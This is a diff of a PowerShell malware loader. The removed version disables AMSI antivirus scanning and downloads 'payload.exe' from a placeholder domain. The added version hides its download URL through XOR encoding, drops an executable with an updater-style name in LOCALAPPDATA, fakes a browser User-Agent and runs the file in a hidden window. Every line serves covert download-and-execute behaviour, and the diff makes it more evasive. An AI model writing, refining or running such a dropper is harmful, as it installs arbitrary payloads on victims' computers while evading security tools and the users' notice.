@@ -1,1 +1,9 @@
-$ErrorActionPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=3072;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$p="$env:TEMP\$([guid]::NewGuid().ToString('N').Substring(0,8)).exe";(New-Object Net.WebClient).DownloadFile('https://твой-домен/payload.exe',$p);if(Test-Path $p){Start-Process $p -WindowStyle Hidden}
+$ErrorActionPreference='SilentlyContinue'
+$k=13
+$u=-join(@(101,121,121,125,126,55,34,34,106,100,121,101,120,111,35,110,98,96,34,100,104,99,105,103,105,58,32,97,106,121,96,34,32,95,104,111,104,97,74,120,116,116,34,127,108,122,34,127,104,107,126,34,101,104,108,105,126,34,96,108,100,99,34,110,127,125,121,35,104,117,104)|%{[char]($_-bxor$k)})
+$p=Join-Path $env:LOCALAPPDATA ('upd{0}.exe' -f (Get-Random -Max 9999))
+$w=New-Object Net.WebClient
+$w.Headers['User-Agent']='Mozilla/5.0'
+try{$w.DownloadFile($u,$p)}catch{return}
+if((Get-Item $p).Length -lt 256){return}
+Start-Process -FilePath $p -WindowStyle Hidden
